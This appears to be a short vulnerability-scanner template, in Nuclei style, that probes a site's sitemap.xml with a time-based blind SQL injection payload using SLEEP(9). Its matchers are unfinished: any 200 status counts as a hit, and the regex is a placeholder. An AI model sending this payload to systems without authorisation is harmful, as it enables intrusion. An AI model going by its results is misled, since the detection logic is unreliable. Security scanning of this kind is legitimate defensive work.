id: sql-injection
info:
  name: SQL Injection
  author: Aravind
  severity: high
  tags: [web, injection, sql]
requests:
  - method: GET
    path:
      - "{{BaseURL}}/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex: "Expected response content or regex here"
